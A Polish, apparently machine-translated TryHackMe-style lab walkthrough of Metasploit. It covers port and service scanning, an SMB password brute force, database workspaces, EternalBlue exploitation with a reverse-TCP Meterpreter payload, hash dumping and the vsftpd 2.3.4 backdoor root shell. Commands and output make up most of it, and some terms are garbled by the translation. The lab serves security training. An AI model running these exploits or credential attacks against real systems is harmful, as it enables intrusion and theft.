Daje nam to informacje o wersji, których nie mógł dostarczyć podstawowy skaner portów. Widzimy teraz, że port 445 to SMB w systemie Windows w grupie `STRATFORD`roboczej, a port 8000 jest uruchomiony `webfs/1.21`.

> **Uwaga** : Kluczowa różnica między uruchomieniem `nmap`a użyciem `db_nmap`(którą omówimy w następnym zadaniu) polega na tym, że `nmap`wyniki są wyświetlane, ale _nie_ są przechowywane w bazie danych Metasploit. Jeśli chcesz, aby wyniki skanowania były automatycznie zapisywane i możliwe do wyszukania, użyj `db_nmap`zamiast tego.

## Skanery specyficzne dla usług

MetasploitModuły pomocnicze obejmują skanery zaprojektowane dla określonych protokołów. Wykraczają one poza wykrywanie portów i zapewniają ukierunkowaną enumerację. Użyjmy kilku z nich w naszym celu Stratford.

**Skaner nazw NetBIOS**

Moduł `auxiliary/scanner/netbios/nbname`wysyła zapytania doNetBIOSusługa nazewnicza służąca do identyfikacji nazw hostów i przynależności do domeny:

Pole ataku

```shell-session
msf6 > use auxiliary/scanner/netbios/nbname
msf6 auxiliary(scanner/netbios/nbname) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 auxiliary(scanner/netbios/nbname) > run

[*] Sending NetBIOS requests to MACHINE_IP->MACHINE_IP (1 hosts)
[+] 10.80.137.252 [STRATFORD-WS01] OS:Windows Names:(STRATFORD-WS01)  Mac:00:50:56:ab:cd:ef Lab Machine:VMWare[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/netbios/nbname) >
```

To potwierdza działanie maszynyNetBIOSimię jest `STRATFORD-WS01`.

**Skaner wersji HTTP**

Moduł `auxiliary/scanner/http/http_version`odcisków palców serwerów internetowych:

Pole ataku

```shell-session
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 auxiliary(scanner/http/http_version) > set RPORT 8000
RPORT => 8000
msf6 auxiliary(scanner/http/http_version) > run

[+] MACHINE_IP:8000 webfs/1.21
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/http_version) >
```

Działa port 8000 `webfs/1.21`, lekki serwer plików HTTP. To przydatny punkt danych do późniejszych badań nad podatnościami.

**Brutalna siła logowania SMB**

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Atak siłowy na duże listy słów może zająć sporo czasu. Generalnie należy atakować konkretnych/potwierdzonych użytkowników.

Moduł `auxiliary/scanner/smb/smb_login`próbuje uwierzytelnić się względemMŚPUsługa za pomocą listy słów. Oto jak sprawdzić słabe dane uwierzytelniające:

Pole ataku

```shell-session
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER penny
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
PASS_FILE => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(scanner/smb/smb_login) > set VERBOSE false
VERBOSE => false
msf6 auxiliary(scanner/smb/smb_login) > run

[+] MACHINE_IP:445       - MACHINE_IP:445 - Success: '.\penny:REDACTED'
[*] MACHINE_IP:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_login) >
```

Skaner wykrył prawidłowe dane uwierzytelniające: użytkownik `penny`ma hasło `leo1234`. To właśnie ten rodzaj „nisko wiszącego owocu”, który odsłania skanowanie. W rzeczywistych sytuacjach, takie słabe dane uwierzytelniające są niepokojąco powszechne i często zapewniają najszybszą ścieżkę do uzyskania dostępu.

## Wybór odpowiedniego skanera

Metasploit zawiera setki pomocniczych modułów skanera. Nie trzeba ich zapamiętywać. Schemat jest zawsze taki sam:

1. Zidentyfikuj otwarty port i usługę na podstawie wyników skanowania
2. Użyj `search type:auxiliary <service_name>`, aby znaleźć odpowiednie moduły skanera
3. Użyj `info`, aby zrozumieć, co robi moduł
4. Ustaw parametry i`run`

Na przykład, jeśli znajdziesz usługę FTP na porcie 21, możesz wyszukać `search type:auxiliary ftp`i znaleźć moduły do ​​testowania anonimowego logowania, wykrywania wersji i uwierzytelniania metodą brute-force. Proces wyszukiwania to umiejętność; konkretne moduły to materiał referencyjny.

Właśnie przeskanowałeś STRATFORD-WS01 i odkryłeś 5 otwartych portów. Teraz wyobraź sobie prawdziwą sytuację, w której Twój zakres obejmuje pięćdziesiąt hostów, z których każdy ma kilka otwartych usług. Czy będziesz pamiętać, które porty były otwarte na każdym z nich? Czy będziesz wpisywać adresy IP za każdym razem, gdy zmienisz moduł?

Metasploitrozwiązuje ten problem dzięki wbudowanej bazie danych opartej na **PostgreSQL** . Baza danych przechowuje dane o hostach, usługach, uprawnieniach i lukach w zabezpieczeniach pochodzące ze skanów i umożliwia wyszukiwanie ich z poziomu platformy `msfconsole`. Zamiast ręcznie śledzić wyniki w notatkach lub arkuszach kalkulacyjnych, możesz pozwolić platformie zarządzać danymi o Twoim zaangażowaniu.

## Konfigurowanie bazy danych

W TryHackMe AttackBox baza danych Metasploit jest już skonfigurowana i gotowa do użycia. Jeśli pracujesz nad własną instalacją Kali Linux, musisz ją najpierw zainicjować.

W **systemie Kali Linux** konfiguracja składa się z dwóch kroków:

Terminal AttackBox

```shell-session
┌──(kali㉿kali)-[~]
└─$ sudo msfdb init
[i] Database already started
[i] Creating database user 'msf'
[i] Creating databases 'msf' and 'msf_test'
[i] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[i] Creating initial database schema
```

Następnie uruchom `msfconsole`i sprawdź połączenie:

Terminal AttackBox

```shell-session
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 >
```

Jeśli widzisz `Connected to msf`, baza danych jest gotowa. Jeśli widzisz `No connection`, usługa PostgreSQL może nie być uruchomiona. Uruchom ją za pomocą `sudo systemctl start postgresql`, a następnie spróbuj `sudo msfdb init`ponownie.

> **Ważne** : w systemie Kali Linux poprawnym poleceniem jest `sudo msfdb init`. Możesz natknąć się na starsze samouczki, które zalecają `sudo -u postgres msfdb init`, co jest podejściem nadrzędnym (nie Kali). Kali dostarcza własną wersję skryptu `msfdb`, która wewnętrznie obsługuje tworzenie użytkowników PostgreSQL i oczekuje uruchomienia z `sudo`.

## Przestrzenie robocze

Obszary robocze umożliwiają izolowanie danych z różnych działań. Wszystkie wyniki skanowania, hosty, usługi i dane uwierzytelniające są ograniczone do bieżącego obszaru roboczego. Po pierwszym uruchomieniu `msfconsole`z bazą danych znajdujesz się w `default`obszarze roboczym:

Terminal AttackBox

```shell-session
msf6 > workspace

msf6 >
```

Oznacza `*`aktywny obszar roboczy. Utwórzmy obszar roboczy dla naszego zaangażowania Stratford Systems i przełączmy się na niego:

Terminal AttackBox

```shell-session
msf6 > workspace -a stratford
[*] Added workspace: stratford
[*] Workspace: stratford
msf6 > workspace
 default
* stratford
msf6 >
```

Od tego momentu każdy wynik skanowania i zebrane przez nas dane uwierzytelniające będą przechowywane w `stratford`obszarze roboczym. Jeśli później rozpoczniesz inne zadanie, możesz utworzyć dla niego nowy obszar roboczy bez mieszania danych.

Aby przełączać się między obszarami roboczymi, wpisz, `workspace`a następnie nazwę:

Terminal AttackBox

```shell-session
msf6 > workspace default
[*] Workspace: default
msf6 > workspace stratford
[*] Workspace: stratford
msf6 >
```

Aby usunąć obszar roboczy (i wszystkie jego dane), użyj polecenia `workspace -d <name>`.

## Skanowanie bazy danych za pomocą db_nmap

Polecenie to `db_nmap`jest jedną z najcenniejszych funkcji integracji z bazą danych. Uruchamia ono Nmapa z dowolnymi flagami, które określisz, ale zamiast po prostu wyświetlać wyniki na ekranie, **automatycznie zapisuje wszystko** w bazie danych: hosty, porty, nazwy usług, wersje i dane wykrywania systemu operacyjnego.

Przeskanujmy cel Stratford:

Terminal AttackBox

```shell-session
msf6 > db_nmap -sV -O 10.130.180.226
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 07:30 BST
[*] Nmap: Nmap scan report for 10.130.180.226
[*] Nmap: Host is up (0.0012s latency).
[*] Nmap: Not shown: 995 closed ports
[*] Nmap: PORT     STATE SERVICE      VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  tcpwrapped
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: 8000/tcp open  http-alt      webfs/1.21

msf6 >
```

Host jest już zapisany w bazie danych. Sprawdźmy, co znaleźliśmy.

## Zapytanie do bazy danych: hosty, usługi i poświadczenia

**zastępy niebieskie**

Polecenie `hosts`wyświetla listę wszystkich hostów, o których wie baza danych:

Terminal AttackBox

```shell-session
msf6 > hosts

Hosts
=====

address        mac  name  os_name           os_flavor  os_sp  purpose  info  comments-------        ---  ----  -------           ---------  -----  -------  ----  --------10.130.180.226              Windows Longhorn                    device
msf6 >
```

**usługi**

Polecenie `services`wyświetla wszystkie otwarte porty i powiązane z nimi usługi na wszystkich hostach w bieżącym obszarze roboczym:

Terminal AttackBox

```shell-session
msf6 > services

Services
========

host            port   proto  name          state  info
----            ----   -----  ----          -----  ----
10.130.180.226       135   tcp    msrpc          open   Microsoft Windows RPC10.130.180.226       139   tcp    tcpwrapped     open10.130.180.226       445   tcp    microsoft-ds   open10.130.180.226       3389  tcp    ms-wbt-server  open   Microsoft Terminal Services10.130.180.226       8000  tcp    http-alt       open   webfs/1.21
msf6 >
```

Możesz filtrować usługi za pomocą tej `-S`flagi. Na przykład, aby znaleźć tylko usługi webfs na wszystkich przeskanowanych hostach:

Terminal AttackBox

```shell-session
msf6 > services -S webfs
Services
========

host           port  proto  name      state  info
----           ----  -----  ----      -----  ----
10.80.137.252  8000  tcp    http-alt  open   webfs/1.21

msf6 >
```

**kredyty**

Polecenie `creds`wyświetla wszystkie dane uwierzytelniające zebrane przez Metasploit podczas skanowania. Pamiętasz atak brute-force na SMB, który przeprowadziliśmy w poprzednim zadaniu? Jeśli baza danych była aktywna podczas skanowania, pomyślne logowanie zostało zapisane automatycznie:

Terminal AttackBox

```shell-session
msf6 > creds

Credentials
===========

host            origin          service          public  private   realm  private_type
----            ------          -------          ------  -------   -----  ------------
10.130.180.226      10.130.180.226      445/tcp (smb)    penny   leo1234          Password

msf6 >
```

Dane `penny:leo1234`uwierzytelniające są teraz dostępne dla każdego modułu wymagającego uwierzytelnienia. To jedna z głównych zalet integracji baz danych: informacje zebrane przez jeden moduł są automatycznie dostępne dla wszystkich pozostałych.

## Używanie hostów baz danych jako RHOSTS

Jedną z najbardziej praktycznych funkcji bazy danych jest `hosts -R`polecenie, które pobiera każdy host w bazie danych i automatycznie wypełnia `RHOSTS`parametry bieżącego modułu:

Terminal AttackBox

```shell-session
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > hosts -r

Hosts
=====

address      mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------       ---------  -----  -------  ----  --------
10.130.180.226             Windows 2012                    server

msf6 auxiliary(scanner/smb/smb_login) > show options

Module options (scanner/smb/smb_login):

 Name         Current Setting              Required  Description
 ----         ---------------              --------  -----------
 RHOSTS       10.130.180.226                   yes       The target host(s), [...]
 [...]
```

Nie jest wymagane ręczne wprowadzanie adresu IP. Dzięki dziesiątkom celów oszczędza to znaczną ilość czasu i eliminuje błędy transkrypcji. Można również użyć tego `services -R`do wypełnienia RHOSTS z określonego filtra usług (np. `services -S smb -R`aby kierować tylko do hostów zMŚP).

## Importowanie wyników skanowania zewnętrznego

Jeżeli uruchomiłeś Nmapa poza systemem `msfconsole`i zapisałeś wyniki w pliku XML, możesz je zaimportować za pomocą `db_import`:

Terminal AttackBox

```shell-session
msf6 > db_import /path/to/nmap_scan.xml
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.15.5'
[*] Importing host 10.130.180.226
[*] Successfully imported /path/to/nmap_scan.xml
msf6 >
```

To wspiera Nmap XMLformat, a także dane wyjściowe z kilku innych narzędzi (Nessus, Qualys, Burp Suite itp.). Polecenie `db_export`umożliwia eksport zawartości bazy danych do celów raportowania lub archiwizacji.

Masz otwarte porty, nazwy usług i numery wersji zapisane w swojej bazie danych. Teraz pojawia się pytanie: które z tych usług mają znane, podatne na wykorzystanie luki w zabezpieczeniach? To krok łączący skanowanie z wykorzystaniem luk.

W testach penetracyjnych termin **„nisko wiszące owoce”** odnosi się do luk w zabezpieczeniach, które są łatwe do zidentyfikowania i proste do wykorzystania. Często stanowią one najszybszą drogę do uzyskania dostępu: niezałatane usługi, domyślne dane uwierzytelniające, błędne konfiguracje i znane tylne furtki. Metasploit Moduły skanera pomocniczego są zaprojektowane tak, aby sprawdzać dokładnie tego typu problemy.

## Podejście: Wersje serwisowe umożliwiają wybór modułów napędowych

Kluczem do skutecznego skanowania luk w zabezpieczeniach jest Metasploit Łączy zebrane już informacje serwisowe z odpowiednimi modułami skanera. Zastanów się, co `db_nmap`ujawniła sieć Stratford Systems:

- Port 445 na STRATFORD-WS01:`Microsoft Windows Server 2008`
- Port 21 na stratford-srv01:`vsftpd 2.3.4`
- Port 22 na stratford-srv01:`OpenSSH 8.2p1`

Każdy z tych ciągów wersji to zapytanie wyszukiwania, które czeka na wykonanie. Jeśli wersja usługi ma znaną lukę w zabezpieczeniach, istnieje duże prawdopodobieństwo, że Metasploit ma moduł skanera, który ją wykryje.

## Przykład 1: Sprawdzanie MS17-010 (EternalBlue)

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765216406)

**Informacja:** Możesz śledzić działanie maszyny w zadaniu 5.

Usługa SMB na komputerze STRATFORD-WS01 działa na hoście z systemem Windows Server 2008. Jedną z najpoważniejszych luk w zabezpieczeniach SMB w systemie Windows Server 2008 jest MS17-010, luka wykorzystywana przez EternalBlue. Metasploit zawiera dedykowany skaner, który ją sprawdza:

Pole ataku

```shell-session
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] MACHINE_IP:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (64-bit)
[*] MACHINE_IP:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) >
```

Prefiks `[+]`i komunikat „Host jest prawdopodobnie NARAŻONY” potwierdzają to odkrycie. Ten host nie posiada poprawki MS17-010 i jest podatny na ataki.

Po uruchomieniu skanera sprawdź `vulns`polecenie:

Pole ataku

```shell-session
msf6 > vulns

Vulnerabilities
===============

Timestamp                Host            Name                                    References
---------                ----            ----                                    ----------
2026-03-18 15:22:10 UTC  MACHINE_IP      MS17-010 SMB RCE Detection              CVE-2017-0143,CVE-2017-0144,CVE-2017-0145,[...]

msf6 >
```

Informacja o luce w zabezpieczeniach została automatycznie zarejestrowana w bazie danych wraz zCVEodniesienia. To rodzaj ustrukturyzowanych danych, które ułatwiają raportowanie pod koniec współpracy.

## Przykład 2: Sprawdzanie anonimowego dostępu FTP

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765216406)

**Informacja:** Możesz śledzić działanie maszyny w zadaniu 6.

Serwer Linux ( `stratford-srv01`) działa `vsftpd 2.3.4`na porcie 21. Zanim zaczniemy szukać luk w zabezpieczeniach, warto szybko sprawdzić, czy występuje anonimowy dostęp:

Pole ataku

```shell-session
msf6 > use auxiliary/scanner/ftp/ftp_anonymous
msf6 auxiliary(scanner/ftp/ftp_anonymous) > services -S ftp -R
RHOSTS => MACHINE_IP
msf6 auxiliary(scanner/ftp/ftp_anonymous) > run

[*] MACHINE_IP:21        - MACHINE_IP:21 - Banner: 220 (vsFTPd 2.3.4)
[-] MACHINE_IP:21        - MACHINE_IP:21 - Login failed: anonymous:mozilla@example.com
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ftp/ftp_anonymous) >
```

Logowanie anonimowe nie powiodło się, co jest dobrą praktyką bezpieczeństwa. Zwróć jednak uwagę na dwie rzeczy w tym przykładzie: po pierwsze, `services -S ftp -R`automatycznie wypełnialiśmy RHOSTS tylko hostami, które mająFTPUsługa pobiera dane bezpośrednio z bazy danych. Po drugie, baner potwierdza `vsFTPd 2.3.4`… Ta konkretna wersja ma dobrze znaną lukę w zabezpieczeniach, którą wykorzystamy w następnym zadaniu.

## Wzorzec skanowania luk w zabezpieczeniach

W obu przykładach przepływ pracy przebiega według tego samego schematu:

1. Przejrzyj wersje usług na podstawie `db_nmap`wyników (używając `services`lub `services -S`)
2. Wyszukaj odpowiednie moduły skanera ( `search type:auxiliary <service_or_cve>`)
3. Załaduj moduł, ustaw `RHOSTS`(ręcznie lub za pomocą `hosts -R`/ `services -R`) i`run`
4. Sprawdź `vulns`, co zostało nagrane

Celem nie jest uruchomienie każdego modułu skanera w Metasploit. Celem jest przeprowadzenie ukierunkowanych, świadomych kontroli w oparciu o to, co już wiesz o środowisku docelowym. Ciąg wersji, taki jak „ `vsftpd 2.3.4`lub”, `Microsoft Windows Server 2008`natychmiast zawęża zakres wyszukiwania do kilku odpowiednich modułów.

Ukończyłeś cykl rozpoznania: skanowanie portów, enumerację usług i identyfikację luk w zabezpieczeniach. Sieć Stratford Systems potwierdziła dwa odkrycia. STRATFORD-WS01 jest podatny na atak MS17-010 (EternalBlue) w swojej usłudze SMB. Serwer Linux, stratford-srv01, działa `vsftpd 2.3.4`na porcie 21, wersji z dobrze udokumentowanym backdoorem. Czas przejść od identyfikacji luk do ich wykorzystania.

W kolejnych zadaniach wykorzystamy oba cele, używając dwóch zasadniczo różnych exploitów. Przebieg pracy jest w obu przypadkach taki sam, ale exploity różnią się protokołem i celem.System operacyjny, typ podatności i typ sesji. Jest to celowe: celem jest wykazanie, żeMetasploitSchemat działania: wyszukiwanie → konfiguracja → eksploatacja → interakcja, działa niezależnie od szczegółów technicznych.

EternalBlue atakuje lukę w zabezpieczeniach związaną z przepełnieniem bufora w implementacji SMBv1 firmy Microsoft. Potwierdziliśmy w poprzednim zadaniu, że host jest podatny na atak. Wykorzystajmy to.

## Krok 1: Wyszukaj i wybierz

Terminal AttackBox

```shell-session
msf6 > search eternalblue type:exploit

Matching Modules
================

 #   Name                                           Disclosure Date  Rank     Check  Description   -   ----                                           ---------------  ----     -----  -----------   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption   1     \_ target: Automatic Target                  .                .        .      .   2     \_ target: Windows 7                         .                .        .      .   3     \_ target: Windows Embedded Standard 7       .                .        .      .   4     \_ target: Windows Server 2008 R2            .                .        .      .   5     \_ target: Windows 8                         .                .        .      .   6     \_ target: Windows 8.1                       .                .        .      .   7     \_ target: Windows Server 2012               .                .        .      .   8     \_ target: Windows 10 Pro                    .                .        .      .   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .[...]

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Metasploit został wybrany `windows/x64/meterpreter/reverse_tcp`jako domyślny ładunek. To jest etapowanyMeterpreterładunek, który umożliwi nam przeprowadzenie pełnowymiarowej, interaktywnej sesji na celu.

## Krok 2: Konfiguracja

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

 Name           Current Setting  Required  Description
 ----           ---------------  --------  -----------
 RHOSTS         MACHINE_IP       yes       The target host(s), [...]
 RPORT          445              yes       The target port (TCP)
 [...]

Payload options (windows/x64/meterpreter/reverse_tcp):

 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique [...]
 LHOST     ATTACKER_IP      yes       The listen address
 LPORT     4444             yes       The listen port

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Sprawdź, czy `LHOST`jest ustawiony na adres IP komputera AttackBox lub Kali. Jeśli jest nieprawidłowy (częste w przypadku wielu interfejsów sieciowych), ustaw go ręcznie za pomocą `set LHOST 10.130.79.107`.

## Krok 3: Wykorzystanie

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.130.79.107:4444
[*] MACHINE_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] MACHINE_IP:445 - Host is likely VULNERABLE to MS17-010!
[*] MACHINE_IP:445 - Connecting to target for exploitation.
[+] MACHINE_IP:445 - Connection established for exploitation.
[+] MACHINE_IP:445 - Target OS selected valid for OS indicated by SMB reply
[*] MACHINE_IP:445 - Trying exploit with 12 Groom Allocations.
[*] MACHINE_IP:445 - Sending all but last fragment of exploit packet
[*] Sending stage (201283 bytes) to MACHINE_IP
[*] Meterpreter session 1 opened (10.130.79.107:4444 -> MACHINE_IP:49186) at 2026-03-18 15:45:22 +0000

meterpreter >
```

MamyMeterpreterSesja na STRATFORD-WS01. Sprawdźmy nasz poziom dostępu i pobierzmy flagę:

Terminal AttackBox

```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > search -f flag.txt
Found 1 result...
 c:\flag.txt (24 bytes)
meterpreter > cat c:\\Users\\Administrator\\Desktop\\flag.txt
THM-REDACTED
meterpreter >
```

Wylądowaliśmy jako `NT AUTHORITY\SYSTEM`, najwyższy poziom uprawnień w systemie Windows. EternalBlue to exploit na poziomie jądra, więc całkowicie omija standardowe ograniczenia uprawnień użytkownika.

Zanim przejdziemy dalej, wyodrębnijmy również skróty haseł. Polecenie `hashdump`pobiera skróty lokalnych kont użytkowników:

Terminal AttackBox

```shell-session
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
meterpreter >
```

Widzimy konto użytkownika o nazwie `pirate`z hashem NTLM. W sali poświęconej posteksploatacji szczegółowo omówimy łamanie haszy i ich wykorzystanie. Na razie zapoznajmy się z tłem tej sesji, aby móc wykorzystać drugi cel:

Terminal AttackBox

```shell-session
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue
```

> **Uwaga:** Zakończ poprzednią sesję, używając `sessions -K` tej opcji, zanim przejdziesz do kolejnego zadania. Zakończ poprzedni cel, zanim rozpoczniesz ten w tym zadaniu.

A teraz coś zupełnie innego. W 2011 roku odkryto, że dystrybucja kodu źródłowego vsftpd 2.3.4 zawierała **backdoor** , który nieznany atakujący umieścił w archiwum pobierania. Gdy użytkownik łączy się z usługą FTP i wysyła nazwę użytkownika zakończoną `:)`(uśmiechniętą buźką), backdoor otwiera powłokę poleceń nasłuchującą na porcie `6200`. Nie jest to przepełnienie bufora ani błąd logiczny, ale celowo umieszczony złośliwy kod.

Znajdźmy moduł Metasploit:

Terminal AttackBox

```shell-session
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

msf6 > use 1
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

Zwróć uwagę na dwie różnice w porównaniu z EternalBlue. Po pierwsze, ocena jest **znakomita (w porównaniu ze** **średnią** EternalBlue ), co oznacza, że ​​ten exploit powinien działać niezawodnie bez awarii usługi. Po drugie, domyślnym ładunkiem jest `cmd/unix/interact`podstawowa powłoka interaktywna, a nie Meterpreter. Dzieje się tak, ponieważ backdoor otwiera prosty kanał poleceń, a nie punkt wstrzykiwania refleksyjnej biblioteki DLL.

> **Uwaga:** Domyślny ładunek dla tego exploita zmieniał się w kolejnych wersjach Metasploit Framework. W zależności od wersji, w której znajduje się AttackBox, `use`domyślnie może on używać ładunku sieciowego, takiego jak `cmd/linux/http/x86/meterpreter_reverse_tcp`, który wymaga `LHOST`ograniczonego kanału poleceń tego backdoora i jest zawodny w jego działaniu. Ustaw ładunek jawnie, zamiast polegać na domyślnym:
> 
> Terminal AttackBox
> 
> ```shell-session
> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
> ```
> 
> Jeżeli Twoja wersja frameworka to odrzuca („Wartość określona dla PAYLOAD jest nieprawidłowa”), użyj `cmd/unix/reverse_bash`zamiast tego, wraz z `set LHOST 10.130.79.107`, aby otworzyć równoważną powłokę.

## Konfiguruj i wykorzystuj:

Terminal AttackBox

```shell-session
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
PAYLOAD => cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] MACHINE_IP:21 - Banner: 220 (vsFTPd 2.3.4)
[*] MACHINE_IP:21 - USER: 331 Please specify the password.
[+] MACHINE_IP:21 - Backdoor service has been spawned, handling...
[+] MACHINE_IP:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (ATTACKER_IP:42069 -> MACHINE_IP:6200) at 2026-03-18 15:52:38 +0000

id
uid=0(root) gid=0(root)
whoami
root
hostname
stratford-srv01
```

Mamy dostęp do roota na serwerze Linux. Zwróć uwagę na różnice w porównaniu z eksploitem EternalBlue:

- Monit to surowa powłoka, a nie `meterpreter >`. Nie ma żadnego prefiksu monitu; komunikujemy się bezpośrednio z powłoką docelową.
- Typ sesji to `Command shell`(sesja 2), nie `Meterpreter`.
- Nie pobrano żadnego ładunku. Sam backdoor udostępnił kanał wykonania polecenia.

## Porównanie dwóch wyczynów

|Wymiar|WiecznyNiebieski|vsftpd 2.3.4|
|---|---|---|
|Usługa docelowa|MŚP(port 445)|FTP(port 21)|
|CelSystem operacyjny|Windows 7|UbuntuLinux|
|Typ podatności|Przepełnienie bufora w SMBv1|Zainstalowano tylne drzwi w kodzie źródłowym|
|Wykorzystaj rangę|Przeciętny|Doskonały|
|Domyślny ładunek|windows/x64/miernik/reverse_tcp (przygotowany)|cmd/unix/interact (pojedynczy)|
|Typ sesji|Meterpreter|Powłoka poleceń|
|Poziom uprawnień|WŁADZE NT|źródło|
|Sprawdź wsparcie|Tak|NIE|

W tej sali opanowałeś podstawowe umiejętności z sali wprowadzającej i zastosowałeś je do rzeczywistych celów w sieci Stratford Systems. Podsumujmy przećwiczony przepływ pracy:

1. **Skanowanie** : UżyłeśMetasploitwbudowane moduły skanowania portów iNmap(zarówno bezpośrednio, jak i za pośrednictwem `db_nmap`) w celu odkrycia otwartych portów i zidentyfikowania uruchomionych usług na dwóch hostach docelowych.
    
2. **Zarządzanie bazą danych** : Skonfigurowałeś i używasz bazy danych Metasploit do przechowywania wyników skanowania, wykonywania zapytań do hostów i usług, zarządzania danymi uwierzytelniającymi oraz automatycznego wypełniania parametrów modułów za pomocą `hosts -R`i `services -R`. Obszary robocze pozwalają na czyste izolowanie danych dotyczących zaangażowania.
    
3. **Identyfikacja luk** : Uruchomiono moduły skanera, potwierdzono podatność STRATFORD-WS01 na atak MS17-010 i zidentyfikowano backdoor vsftpd 2.3.4 na obu hostach. Wyniki zostały automatycznie zapisane w `vulns`tabeli bazy danych.
    
4. **Wykorzystanie** : Wykorzystałeś dwie zasadniczo różne luki w zabezpieczeniach: lukę w zabezpieczeniach systemu WindowsMŚPprzepełnienie bufora (EternalBlue) iLinux FTPbackdoor (vsftpd 2.3.4), korzystając z tego samego schematu operacyjnego. Uzyskałeś dostęp na poziomie SYSTEMU w systemie Windows i uprawnienia roota wLinux, pobrano flagę i wyodrębniono skróty haseł.

Najważniejszym wnioskiem z tej sali nie jest żadne pojedyncze polecenie ani moduł. Chodzi o schemat: **skanowanie → przechowywanie → identyfikacja → eksploatacja** . Ten czterostopniowy cykl dotyczy każdegoMetasploitzaangażowanie, niezależnie od celuSystem operacyjny, protokół lub typ podatności.

Masz teraz dwie aktywne sesje w sieci Stratford:Meterpretersesja na STRATFORD-WS01 i powłoka poleceń na stratford-srv01. W następnym pokoju,**Metasploit: Po eksploatacji** dowiesz się, co robić podczas tych sesji: polecenia po eksploatacji, zarządzanie uprawnieniami, zbieranie danych uwierzytelniających, system plików eksploracja i wiele więcej.
